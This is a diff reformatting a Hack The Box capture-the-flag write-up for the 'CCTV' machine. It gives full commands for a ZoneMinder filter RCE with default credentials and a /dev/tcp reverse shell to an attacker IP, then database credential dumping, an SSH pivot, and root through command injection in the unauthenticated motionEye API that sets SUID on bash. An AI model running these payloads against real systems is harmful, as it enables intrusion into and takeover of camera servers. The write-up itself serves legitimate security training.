@@ -1,31 +1,66 @@
-# CCTV.htb — Step-by-Step Walkthrough
+<div align="center">
 
-**Target IP:** <Target_IP>
-**Attacker IP:** <Your_IP_Address>
-**Difficulty:** Medium
-**Platform:** Hack The Box (Authorized Pentest)
+# CCTV — HackTheBox
+
+![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge)
+![OS](https://img.shields.io/badge/OS-Linux-blue?style=for-the-badge)
+![Status](https://img.shields.io/badge/Status-Rooted-success?style=for-the-badge)
+
+<img src="../assets/MrsNobody.png" width="200" alt="MrsNobody">
+
+**MrsNobody**
+
+[![HTB](https://img.shields.io/badge/HackTheBox-Profile-green?style=flat&logo=hackthebox)](https://app.hackthebox.com)
 
 ---
 
-# 1. Initial Reconnaissance
+</div>
+
+> **Disclaimer:** This writeup is for educational purposes only, performed in an authorized Hack The Box environment.
+
+## Target Information
+
+| Property | Value |
+|----------|-------|
+| Machine | CCTV |
+| IP | `<TARGET_IP>` |
+| OS | Linux |
+| Difficulty | Medium |
+| Hostname | cctv.htb |
+
+## Table of Contents
+
+1. [Initial Reconnaissance](#initial-reconnaissance)
+2. [Web Exploitation — ZoneMinder](#web-exploitation--zoneminder)
+3. [Lateral Movement — User: mark](#lateral-movement--user-mark)
+4. [Privilege Escalation — Root](#privilege-escalation--root)
+5. [Flags](#flags)
+6. [Summary](#summary)
+
+---
+
+## Initial Reconnaissance
 
 We begin with an Nmap scan to identify open ports and services.
 
 ```bash
-nmap -sC -sV -oN nmap_cctv.txt <Target_IP>
+nmap -sC -sV -oN nmap_cctv.txt <TARGET_IP>
 ```
 
-### Results
+<details>
+<summary>Nmap Results</summary>
 
 ```
 Port 22: SSH (OpenSSH 9.6p1)
 Port 80: HTTP (Apache 2.4.58)
 ```
 
-Navigating to:
+</details>
+
+Navigating to the web server:
 
 ```
-http://<Target_IP>/
+http://<TARGET_IP>/
 ```
 
 Reveals a **ZoneMinder CCTV monitoring system** located at:
@@ -36,7 +71,7 @@ Reveals a **ZoneMinder CCTV monitoring system** located at:
 
 ---
 
-# 2. Web Exploitation (ZoneMinder)
+## Web Exploitation -- ZoneMinder
 
 The web application is running:
 
@@ -44,28 +79,26 @@ The web application is running:
 ZoneMinder v1.37.63
 ```
 
-This version is vulnerable to **Filter-based authenticated Remote Code Execution (RCE).**
+This version is vulnerable to **Filter-based authenticated Remote Code Execution (RCE)**.
 
----
-
-# Authentication & Session Priming
+### Authentication and Session Priming
 
 ZoneMinder enforces **CSRF protection**, so we must first authenticate and obtain a valid session cookie.
 
-### Capture Login Page CSRF Token
+#### Capture Login Page CSRF Token
 
 ```bash
-# Capture login page CSRF token
-L_CSRF=$(curl -s -c cookies.txt --resolve cctv.htb:80:<Target_IP> \
+# Extract the CSRF token from the login page and store the session cookie
+L_CSRF=$(curl -s -c cookies.txt --resolve cctv.htb:80:<TARGET_IP> \
 "http://cctv.htb/zm/index.php?view=login" \
 | grep -oP "__csrf_magic' value=\"\K[^\"]+")
 ```
 
-### Login Using Default Credentials
+#### Login Using Default Credentials
 
 ```bash
-# Login as admin:admin
-curl -s -b cookies.txt -c cookies.txt --resolve cctv.htb:80:<Target_IP> \
+# Authenticate to ZoneMinder with default admin:admin credentials
+curl -s -b cookies.txt -c cookies.txt --resolve cctv.htb:80:<TARGET_IP> \
 -X POST "http://cctv.htb/zm/index.php" \
 --data-urlencode "view=login" \
 --data-urlencode "action=login" \
@@ -74,36 +107,34 @@ curl -s -b cookies.txt -c cookies.txt --resolve cctv.htb:80:<Target_IP> \
 --data-urlencode "password=admin"
 ```
 
----
-
-# Capturing Filter CSRF Token
+### Capturing Filter CSRF Token
 
 Once authenticated, we access the filter page to obtain a new CSRF token.
 
 ```bash
-CSRF=$(curl -s -b cookies.txt --resolve cctv.htb:80:<Target_IP> \
+# Retrieve a fresh CSRF token from the filter view for the RCE payload
+CSRF=$(curl -s -b cookies.txt --resolve cctv.htb:80:<TARGET_IP> \
 "http://cctv.htb/zm/?view=filter" \
 | grep -oP "__csrf_magic' value=\"\K[^\"]+")
 
 echo "Captured CSRF: $CSRF"
 ```
 
----
-
-# Executing the Reverse Shell
+### Executing the Reverse Shell
 
 We inject a reverse shell through the **AutoExecuteCmd** parameter.
 
-### Start Listener
+Start the listener:
 
 ```bash
 nc -lvnp 4444
 ```
 
-### Trigger RCE
+Trigger the RCE:
 
 ```bash
-curl -s -b cookies.txt --resolve cctv.htb:80:<Target_IP> -X POST \
+# Inject a reverse shell payload via the ZoneMinder filter AutoExecuteCmd parameter
+curl -s -b cookies.txt --resolve cctv.htb:80:<TARGET_IP> -X POST \
 "http://cctv.htb/zm/?view=filter&action=execute" \
 --data-urlencode "__csrf_magic=$CSRF" \
 --data-urlencode "filter[Name]=pwn" \
@@ -111,11 +142,11 @@ curl -s -b cookies.txt --resolve cctv.htb:80:<Target_IP> -X POST \
 --data-urlencode "filter[Query][terms][0][op]=>=" \
 --data-urlencode "filter[Query][terms][0][val]=0" \
 --data-urlencode "filter[AutoExecute]=1" \
---data-urlencode "filter[AutoExecuteCmd]=bash -c 'bash -i >& /dev/tcp/<Your_IP_Address>/4444 0>&1'" \
+--data-urlencode "filter[AutoExecuteCmd]=bash -c 'bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1'" \
 --data-urlencode "filter[Background]=1"
 ```
 
-A reverse shell should connect back as:
+A reverse shell connects back as:
 
 ```
 www-data
@@ -123,17 +154,17 @@ www-data
 
 ---
 
-# 3. Lateral Movement (User: mark)
+## Lateral Movement -- User: mark
 
 After gaining shell access, we enumerate the local database.
 
-## Extract Database Credentials
+### Extract Database Credentials
 
 ```bash
 cat /etc/zm/zm.conf | grep ZM_DB
 ```
 
-## Dump the Users Table
+### Dump the Users Table
 
 ```bash
 mysql -u zmuser -pzmpass -D zm -e 'select Username,Password from Users;'
@@ -147,14 +178,12 @@ After cracking the hash:
 Password: opensesame
 ```
 
----
-
-# SSH Pivot
+### SSH Pivot
 
 Using the recovered credentials:
 
 ```bash
-ssh mark@<Target_IP>
+ssh mark@<TARGET_IP>
 ```
 
 ```
@@ -163,9 +192,9 @@ Password: opensesame
 
 ---
 
-# 4. Privilege Escalation (Root)
+## Privilege Escalation -- Root
 
-While enumerating the system as **mark**, we discover:
+While enumerating the system as **mark**, we discover a secondary home directory:
 
 ```
 /home/sa_mark
@@ -178,9 +207,7 @@ Port 7999 — Control API
 Port 8765 — Web Interface
 ```
 
----
-
-# Vulnerability Analysis
+### Vulnerability Analysis
 
 The motion control API on **port 7999** is **unauthenticated**.
 
@@ -190,43 +217,29 @@ Inspecting the configuration:
 /etc/motioneye/camera-1.conf
 ```
 
-Shows that the service executes a script via:
+Shows that the service executes a script via the `on_event_start` parameter. This service runs as **root** to interact with camera drivers.
 
-```
-on_event_start
-```
+The `snapshot_filename` parameter is passed to a shell command without proper sanitization, allowing **command injection**.
 
-This service runs as **root** to interact with camera drivers.
-
-The parameter:
-
-```
-snapshot_filename
-```
-
-Is passed to a shell command without proper sanitization, allowing **command injection**.
-
----
-
-# Exploitation
+### Exploitation
 
 We inject a payload to set the **SUID bit on /bin/bash**.
 
-### Inject Payload
+#### Inject Payload
 
 ```bash
+# Inject a command into snapshot_filename that sets the SUID bit on /bin/bash
 python3 -c "import urllib.request; urllib.request.urlopen('http://127.0.0.1:7999/1/config/set?snapshot_filename=%24(chmod%20u%2bs%20/bin/bash)')"
 ```
 
-### Trigger Snapshot
+#### Trigger Snapshot
 
 ```bash
+# Trigger a snapshot to execute the injected command as root
 python3 -c "import urllib.request; urllib.request.urlopen('http://127.0.0.1:7999/1/action/snapshot')"
 ```
 
----
-
-# Verify SUID Bash
+### Verify SUID Bash
 
 ```bash
 ls -l /bin/bash
@@ -238,9 +251,7 @@ Result:
 -rwsr-xr-x
 ```
 
----
-
-# Escalate to Root
+### Escalate to Root
 
 ```bash
 /bin/bash -p
@@ -250,43 +261,33 @@ Root shell obtained.
 
 ---
 
-# 5. Flags
+## Flags
 
-## User Flag
-
-```bash
-cat /home/sa_mark/user.txt
-```
-
-```
-<REDACTED_USER_FLAG>
-```
+| Flag | Value |
+|------|-------|
+| User | `<REDACTED>` |
+| Root | `<REDACTED>` |
 
 ---
 
-## Root Flag
+## Summary
 
-```bash
-cat /root/root.txt
-```
-
-```
-<REDACTED_ROOT_FLAG>
-```
-
----
-
-# Summary
-
-| Stage                | Method                          |
-| -------------------- | ------------------------------- |
-| Reconnaissance       | Nmap scanning                   |
-| Initial Access       | ZoneMinder Filter RCE           |
-| Lateral Movement     | Database credential extraction  |
-| Pivot                | SSH login as mark               |
+| Stage | Method |
+|-------|--------|
+| Reconnaissance | Nmap scanning |
+| Initial Access | ZoneMinder Filter RCE |
+| Lateral Movement | Database credential extraction |
+| Pivot | SSH login as mark |
 | Privilege Escalation | motionEye API command injection |
 
 ---
 
-**Date:** 2026-03-07
-**Machine:** CCTV.htb
+<div align="center">
+
+**Written by MrsNobody**
+
+<img src="../assets/MrsNobody.png" width="80">
+
+*Hack The Box — CCTV*
+
+</div>
